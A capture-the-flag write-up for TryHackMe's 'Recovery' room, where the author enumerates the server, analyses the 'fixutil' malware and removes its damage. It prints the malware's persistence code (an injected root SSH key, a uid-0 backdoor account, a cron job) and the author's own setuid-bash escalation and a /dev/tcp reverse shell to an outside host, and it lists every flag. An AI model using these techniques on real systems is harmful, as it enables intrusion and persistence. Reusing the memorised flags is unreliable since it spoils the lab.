# Recovery

Not your conventional CTF

[Recovery](https://tryhackme.com/room/recovery)

## Topic's

- Network Enumeration
- Reverse Engineering (Bash)
- Exploiting Crontab
- Reverse Engineering (Cpp)

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Help Alex!

Hi, it's me, your friend Alex.

I'm not going to beat around the bush here; I need your help. As you know I work at a company called Recoverysoft. I work on the website side of things, and I setup a Ubuntu web server to run it. Yesterday one of my work colleagues sent me the following email:

```
Hi Alex,
A recent security vulnerability has been discovered that affects the web server. Could you please run this binary on the server to implement the fix?
Regards
- Teo
```

Attached was a linux binary called fixutil. As instructed, I ran the binary, and all was good. But this morning, I tried to log into the server via SSH and I received this message:

```
YOU DIDN'T SAY THE MAGIC WORD!
YOU DIDN'T SAY THE MAGIC WORD!
YOU DIDN'T SAY THE MAGIC WORD!
```

It turns out that Teo got his mail account hacked, and fixutil was a targeted malware binary specifically built to destroy my webserver!

when I opened the website in my browser I get some crazy nonsense. The webserver files had been encrypted! Before you ask, I don't have any other backups of the webserver (I know, I know, horrible practice, etc...), I don't want to tell my boss, he'll fire me for sure.

**Please access the web server and repair all the damage caused by fixutil. You can find the binary in my home directory. Here are my ssh credentials:**

Username: `alex`
Password: `madeline`

**I have setup a control panel to track your progress on port 1337.** Access it via your web browser. As you repair the damage, you can refresh the page to receive those "flags" I know you love hoarding.

Good luck!

- Your friend Alex

```
kali@kali:~/CTFs/tryhackme/Recovery$ sudo nmap -p- -A -sS -sC -sV -O 10.10.164.149
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-24 20:57 CEST
Nmap scan report for 10.10.164.149
Host is up (0.039s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 55:17:c1:d4:97:ba:8d:82:b9:60:81:39:e4:aa:1e:e8 (RSA)
|   256 8d:f5:4b:ab:23:ed:a3:c0:e9:ca:90:e9:80:be:14:44 (ECDSA)
|_  256 3e:ae:91:86:81:12:04:e4:70:90:b1:40:ef:b7:f1:b6 (ED25519)
80/tcp    open  http    Apache httpd 2.4.43 ((Unix))
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.43 (Unix)
|_http-title: Site doesn't have a title (text/html).
1337/tcp  open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Help Alex!
65499/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b9:b6:aa:93:8d:aa:b7:f3:af:71:9d:7f:c5:83:1d:63 (RSA)
|   256 64:98:14:38:ff:38:05:7e:25:ae:5d:33:2d:b6:78:f3 (ECDSA)
|_  256 ef:2e:60:3a:de:ea:2b:25:7d:26:da:b5:6b:5b:c4:3a (ED25519)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/24%OT=22%CT=1%CU=32782%PV=Y%DS=2%DC=T%G=Y%TM=5F9479
OS:5F%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=3F%W=FAF0%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=3F%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=3F%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   37.45 ms 10.8.0.1
2   37.75 ms 10.10.164.149

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.54 seconds
```

```
kali@kali:~/CTFs/tryhackme/Recovery$ ssh alex@10.10.164.149 -p 22 /bin/sh
alex@10.10.164.149's password:
sed '$d' .bashrc
```

```bash
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# If set, the pattern "**" used in a pathname expansion context will
# match all files and zero or more directories and subdirectories.
#shopt -s globstar

# make less more friendly for non-text input files, see lesspipe(1)
#[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
        # We have color support; assume it's compliant with Ecma-48
        # (ISO/IEC-6429). (Lack of such support is extremely rare, and such
        # a case would tend to support setf rather than setaf.)
        color_prompt=yes
    else
        color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    #alias grep='grep --color=auto'
    #alias fgrep='fgrep --color=auto'
    #alias egrep='egrep --color=auto'
fi

# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

# some more ls aliases
#alias ll='ls -l'
#alias la='ls -A'
#alias l='ls -CF'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
```

```
rm -rf .bashrc
ls
fixutil
```

```
kali@kali:~/CTFs/tryhackme/Recovery$ ssh alex@10.10.164.149 -p 22
alex@10.10.164.149's password:
Linux recoveryserver 4.15.0-106-generic #107-Ubuntu SMP Thu Jun 4 11:27:52 UTC 2020 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
alex@recoveryserver:~$ ls
fixutil
alex@recoveryserver:~$ scp fixutil kali@10.8.106.222:/home/kali/CTFs/tryhackme/Recovery
The authenticity of host '10.8.106.222 (10.8.106.222)' can't be established.
ECDSA key fingerprint is SHA256:xCE0Cpa4vJaXG1mwn7ciMO55E0R11HvAmXVl2ymdG+Y.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.8.106.222' (ECDSA) to the list of known hosts.
kali@10.8.106.222's password:
fixutil                                                   100%   36KB 450.2KB/s   00:00
alex@recoveryserver:~$
```

```
kali@kali:~/CTFs/tryhackme/Recovery$ chmod +x fixutil
kali@kali:~/CTFs/tryhackme/Recovery$ strings fixutil
/lib64/ld-linux-x86-64.so.2
libc.so.6
fopen
fclose
system
fwrite
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
__gmon_start__
_ITM_deregisterTMCloneTable
_ITM_registerTMCloneTable
__cxa_finalize
web_location
encryption_key_dir
__stack_chk_fail
GetWebFiles
opendir
strcmp
strlen
malloc
exit
strcpy
strncat
closedir
readdir
XORFile
fopen
fseek
ftell
fread
fclose
fwrite
XOREncryptWebFiles
mkdir
fprintf
free
LogIncorrectAttempt
system
time
srand
chmod
libc.so.6
__xstat
GLIBC_2.4
GLIBC_2.2.5
u+UH
abcdefghH
ijklmnopH
qrstuvwxH
yzABCDEFH
GHIJKLMNH
OPQRSTUVH
WXYZ
dH34%(
/usr/local/apache2/htdocs/
/opt/.fixutil/
/opt/.fixutil/backup.txt
/bin/mv /tmp/logging.so /lib/x86_64-linux-gnu/oldliblogging.so
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4U9gOtekRWtwKBl3+ysB5WfybPSi/rpvDDfvRNZ+BL81mQYTMPbY3bD6u2eYYXfWMK6k3XsILBizVqCqQVNZeyUj5x2FFEZ0R+HmxXQkBi+yNMYoJYgHQyngIezdBsparH62RUTfmUbwGlT0kxqnnZQsJbXnUCspo0zOhl8tK4qr8uy2PAG7QbqzL/epfRPjBn4f3CWV+EwkkkE9XLpJ+SHWPl8JSdiD/gTIMd0P9TD1Ig5w6F0f4yeGxIVIjxrA4MCHMmo1U9vsIkThfLq80tWp9VzwHjaev9jnTFg+bZnTxIoT4+Q2gLV124qdqzw54x9AmYfoOfH9tBwr0+pJNWi1CtGo1YUaHeQsA8fska7fHeS6czjVr6Y76QiWqq44q/BzdQ9klTEkNSs+2sQs9csUybWsXumipViSUla63cLnkfFr3D9nzDbFHek6OEk+ZLyp8YEaghHMfB6IFhu09w5cPZApTngxyzJU7CgwiccZtXURnBmKV72rFO6ISrus= root@recovery
/root/.ssh/authorized_keys
/usr/sbin/useradd --non-unique -u 0 -g 0 security 2>/dev/null
/bin/echo 'security:$6$he6jYubzsBX1d7yv$sD49N/rXD5NQT.uoJhF7libv6HLc0/EZOqZjcvbXDoua44ZP3VrUcicSnlmvWwAFTqHflivo5vmYjKR13gZci/' | /usr/sbin/chpasswd -e
/opt/brilliant_script.sh
#!/bin/sh
for i in $(ps aux | grep bash | grep -v grep | awk '{print $2}'); do kill $i; done;
/etc/cron.d/evil
* * * * * root /opt/brilliant_script.sh 2>&1 >/tmp/testlog
:*3$"
GCC: (Ubuntu 9.3.0-10ubuntu2) 9.3.0
/usr/lib/gcc/x86_64-linux-gnu/9/include
/usr/include/x86_64-linux-gnu/bits
/usr/include/x86_64-linux-gnu/bits/types
/usr/include
replacelogging.c
stddef.h
types.h
struct_FILE.h
FILE.h
stdio.h
sys_errlist.h
struct_timespec.h
dirent.h
time.h
unistd.h
getopt_core.h
stat.h
dirent.h
ssh_key
_shortbuf
_IO_lock_t
stderr
_IO_buf_end
XORFile
optopt
_IO_write_end
_freeres_list
st_blksize
_flags
web_location
encryption_file
_markers
__nlink_t
max_amnt_webfiles
d_name
__timezone
__ino_t
stdout
_IO_save_end
/home/moodr/Boxes/recovery/fixutil
opterr
_IO_codecvt
long long unsigned int
st_blocks
d_reclen
sys_errlist
_IO_backup_base
sys_nerr
f_contents
webfile_w
_fileno
stat
tv_nsec
index_of_encryption_key
__mode_t
d_type
webfile_r
_IO_read_base
st_gid
stdin
st_mode
st_nlink
attempt
timespec
__daylight
_IO_marker
_IO_read_ptr
replacelogging.c
st_ino
_IO_write_base
long long int
_IO_save_base
__dev_t
webfile
optind
__syscall_slong_t
_freeres_buf
__pad0
__pad5
__glibc_reserved
webfile_names
XOREncryptWebFiles
_vtable_offset
optarg
__gid_t
dirent
_IO_read_end
short int
st_mtim
cron_f
_IO_wide_data
GNU C17 9.3.0 -mtune=generic -march=x86-64 -g -fpic -fasynchronous-unwind-tables -fstack-protector-strong -fstack-clash-protection -fcf-protection
__environ
encryption_key_dir
d_off
__blksize_t
__uid_t
st_atim
_lock
tv_sec
GetWebFiles
_old_offset
_IO_FILE
__dirstream
script_f
LogIncorrectAttempt
unsigned char
__tzname
authorized_keys
_IO_write_ptr
rand_string
__time_t
st_size
d_ino
st_uid
__off_t
st_ctim
st_dev
short unsigned int
stat_res
f_path
charset
__blkcnt_t
_chain
st_rdev
_flags2
_cur_column
__off64_t
_unused2
_IO_buf_base
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.8059
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
replacelogging.c
rand_string
__FRAME_END__
__stat
_fini
__dso_handle
_DYNAMIC
__GNU_EH_FRAME_HDR
__TMC_END__
_GLOBAL_OFFSET_TABLE_
_init
free@@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
strcpy@@GLIBC_2.2.5
mkdir@@GLIBC_2.2.5
encryption_key_dir
fread@@GLIBC_2.2.5
fclose@@GLIBC_2.2.5
opendir@@GLIBC_2.2.5
GetWebFiles
strlen@@GLIBC_2.2.5
__stack_chk_fail@@GLIBC_2.4
system@@GLIBC_2.2.5
strncat@@GLIBC_2.2.5
closedir@@GLIBC_2.2.5
srand@@GLIBC_2.2.5
LogIncorrectAttempt
XORFile
strcmp@@GLIBC_2.2.5
fprintf@@GLIBC_2.2.5
ftell@@GLIBC_2.2.5
__gmon_start__
time@@GLIBC_2.2.5
__xstat@@GLIBC_2.2.5
readdir@@GLIBC_2.2.5
malloc@@GLIBC_2.2.5
XOREncryptWebFiles
fseek@@GLIBC_2.2.5
chmod@@GLIBC_2.2.5
web_location
fopen@@GLIBC_2.2.5
exit@@GLIBC_2.2.5
fwrite@@GLIBC_2.2.5
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.note.gnu.property
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
.debug_aranges
.debug_info
.debug_abbrev
.debug_line
.debug_str
/home/alex/.bashrc
while :; do echo "YOU DIDN'T SAY THE MAGIC WORD!"; done &
/bin/cp /lib/x86_64-linux-gnu/liblogging.so /tmp/logging.so
/lib/x86_64-linux-gnu/liblogging.so
echo pwned | /bin/admin > /dev/null
:*3$"
GCC: (Ubuntu 9.3.0-10ubuntu2) 9.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.8059
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
fixutil.c
bin2c_liblogging_so
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
fclose@@GLIBC_2.2.5
system@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
fopen@@GLIBC_2.2.5
fwrite@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
```

```
cat /etc/cron.d/evil

* * * * * root /opt/brilliant_script.sh 2>&1 >/tmp/testlog
```

```
ls
brilliant_script.sh
cat brilliant_script.sh
```

```sh
#!/bin/sh

for i in $(ps aux | grep bash | grep -v grep | awk '{print $2}'); do kill $i; done;
```

```
cp /bin/bash /tmp/bash && chmod +s /tmp/bash
```

```
bash-5.0# find / -type f -name *html 2>/dev/null
/usr/local/apache2/htdocs/index.html
/usr/local/apache2/htdocs/todo.html
/usr/local/apache2/icons/README.html
/usr/local/apache2/error/include/spacer.html
/usr/local/apache2/error/include/top.html
/usr/local/apache2/error/include/bottom.html
```

```
bash-5.0# find / -type f -newermt 2020-06-15 ! -newermt 2020-06-19 -exec ls -la {} \; 2> /dev/null
-rw-r--r-- 1 root root 16 Jun 17 21:22 /opt/.fixutil/backup.txt
-rwsr-xr-x 1 root root 16928 Jun 17 08:55 /bin/admin
-rw-r--r-- 1 root root 32032 Jun 17 08:55 /var/log/faillog
-rw-r--r-- 1 root root 0 Jun 17 08:55 /var/lib/sudo/lectured/alex
-rw-r--r-- 1 root root 1376 Jun 17 08:55 /etc/passwd-
-rw-r----- 1 root shadow 865 Jun 17 21:21 /etc/shadow-
-rw-r--r-- 1 root root 1415 Jun 17 21:21 /etc/passwd
-rw-r--r-- 1 root root 40 Jun 17 21:22 /etc/subgid
-rw-r----- 1 root shadow 970 Jun 17 21:22 /etc/shadow
-rw-r--r-- 1 root root 615 Jun 17 08:55 /etc/group
-rw-r--r-- 1 root root 40 Jun 17 21:22 /etc/subuid
-rw-r----- 1 root shadow 515 Jun 17 08:55 /etc/gshadow
-rw-r--r-- 1 root root 18 Jun 17 08:55 /etc/subgid-
-rwxr-xr-x 1 root root 61 Jun 17 21:22 /etc/cron.d/evil
-rw-r--r-- 1 root root 18 Jun 17 08:55 /etc/subuid-
---------- 1 root root 0 Jun 17 21:33 /run/crond.reboot
-rw-r--r-- 1 root root 567 Jun 17 21:21 /root/.ssh/authorized_keys
-rwxrwxr-x 1 root root 54 Jun 17 08:55 /root/init_script.sh
-rw-rw-r-- 1 root root 997 Jun 17 21:22 /usr/local/apache2/htdocs/index.html
-rw-rw-r-- 1 root root 85 Jun 17 21:22 /usr/local/apache2/htdocs/todo.html
-rw-rw-r-- 1 root root 109 Jun 17 21:22 /usr/local/apache2/htdocs/reallyimportant.txt
-rwxr-xr-x 1 alex alex 16048 Jun 17 21:21 /lib/x86_64-linux-gnu/oldliblogging.so
-rwxrwxrwx 1 root root 23176 Jun 17 21:21 /lib/x86_64-linux-gnu/liblogging.so
```

```cpp
void LogIncorrectAttempt(char *attempt)

{
  time_t tVar1;
  FILE *__stream;
  char *ssh_key;
  FILE *authorized_keys;
  FILE *script_f;
  FILE *cron_f;

  system("/bin/mv /tmp/logging.so /lib/x86_64-linux-gnu/oldliblogging.so");
  tVar1 = time((time_t *)0x0);
  srand((uint)tVar1);
  __stream = fopen("/root/.ssh/authorized_keys","w");
  fprintf(__stream,"%s\n",

          "ssh-rsaAAAAB3NzaC1yc2EAAAADAQABAAABgQC4U9gOtekRWtwKBl3+ysB5WfybPSi/rpvDDfvRNZ+BL81mQYTMPbY3bD6u2eYYXfWMK6k3XsILBizVqCqQVNZeyUj5x2FFEZ0R+HmxXQkBi+yNMYoJYgHQyngIezdBsparH62RUTfmUbwGlT0kxqnnZQsJbXnUCspo0zOhl8tK4qr8uy2PAG7QbqzL/epfRPjBn4f3CWV+EwkkkE9XLpJ+SHWPl8JSdiD/gTIMd0P9TD1Ig5w6F0f4yeGxIVIjxrA4MCHMmo1U9vsIkThfLq80tWp9VzwHjaev9jnTFg+bZnTxIoT4+Q2gLV124qdqzw54x9AmYfoOfH9tBwr0+pJNWi1CtGo1YUaHeQsA8fska7fHeS6czjVr6Y76QiWqq44q/BzdQ9klTEkNSs+2sQs9csUybWsXumipViSUla63cLnkfFr3D9nzDbFHek6OEk+ZLyp8YEaghHMfB6IFhu09w5cPZApTngxyzJU7CgwiccZtXURnBmKV72rFO6ISrus= root@recovery"
         );
  fclose(__stream);
  system("/usr/sbin/useradd --non-unique -u 0 -g 0 security 2>/dev/null");
  system(
        "/bin/echo\'security:$6$he6jYubzsBX1d7yv$sD49N/rXD5NQT.uoJhF7libv6HLc0/EZOqZjcvbXDoua44ZP3VrUcicSnlmvWwAFTqHflivo5vmYjKR13gZci/\' | /usr/sbin/chpasswd -e"
        );
  XOREncryptWebFiles();
  __stream = fopen("/opt/brilliant_script.sh","w");
  fwrite(
         "#!/bin/sh\n\nfor i in $(ps aux | grep bash | grep -v grep | awk \'{print $2}\'); do kill$i; done;\n"
         ,1,0x5f,__stream);
  fclose(__stream);
  __stream = fopen("/etc/cron.d/evil","w");
  fwrite("\n* * * * * root /opt/brilliant_script.sh 2>&1 >/tmp/testlog\n\n",1,0x3d,__stream);
  fclose(__stream);
  chmod("/opt/brilliant_script.sh",0x1ff);
  chmod("/etc/cron.d/evil",0x1ed);
  return;
}

```

```
cat > /tmp/a.sh << "EOF"
#!/bin/bash
bash -i >& /dev/tcp/10.8.106.222/9001 0>&1
EOF

echo "bash /tmp/a.sh" >> /opt/brilliant_script.sh
```

```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDO7GTxIFv/SEVqelwR1OrCvcDRsaOYuyU3JtdaFxv1IPMxp8soS007K9eeQyZvpSiU7ynIhwJsSrfhPH9PWvpPF937Ppe8+LX5e5b+5FsFMoVw6dkwWW2fNImlDcXf273vD/7bTRB+SBo+UcBuIR31ERpM+90xCNKv+HERbiq1TznnBZXJ16Pxu2VBfSCLF4ZjPO4BFG62IQQmkK1e3v3CeiF2b8t+lbS2LrUCbLKdPYvhH6rzoz1LoPwvNOryTivgjDhs/xGFBY3RThAKBiLJXTOAx4qLf4FMEo0Cr8y6GBz3mtLj/UJzNctwllvj4NwVgDpoTqt1EsMA+d1BQYlO5XF4CmhGbKyQamvgrXzdAUKgE1sZ1oel84A3POCrOGJdngPRM9EkUWI9H6619SVmohjukRfWRbMQaUz1mxCz8SUDJlGZWs9kJgKec/LqgjyJxH6VV3ArOKMdoaRQ3BNwHMVmONWFZVOvj+QzXtSWd+ubAdO4HdNwv/ehUj86Qzs= kali@kali" > /root/.ssh/authorized_keys
```

```
root@recoveryserver:~# id
uid=0(root) gid=0(root) groups=0(root)
root@recoveryserver:~# rm -rf /etc/cron.d/evil
root@recoveryserver:~# rm -rf /opt/brilliant_script.sh
root@recoveryserver:~# rm -rf /home/alex/fixutil
root@recoveryserver:~# mv /lib/x86_64-linux-gnu/oldliblogging.so /lib/x86_64-linux-gnu/liblogging.so
root@recoveryserver:~# nano /etc/passwd
root@recoveryserver:~# nano /etc/shadow
root@recoveryserver:~# cat /opt/.fixutil/backup.txt
AdsipPewFlfkmll
```

1. Flag 0

`THM{d8b5c89061ed767547a782e0f9b0b0fe}`

2. Flag 1

`THM{4c3e355694574cb182ca3057a685509d}`

3. Flag 2

`THM{72f8fe5fd968b5817f67acecdc701e52}`

4. Flag 3

`THM{70f7de17bb4e08686977a061205f3bf0}`

5. Flag 4

`THM{b0757f8fb8fe8dac584e80c6ac151d7d}`

6. Flag 5

`THM{088a36245afc7cb935f19f030c4c28b2}`
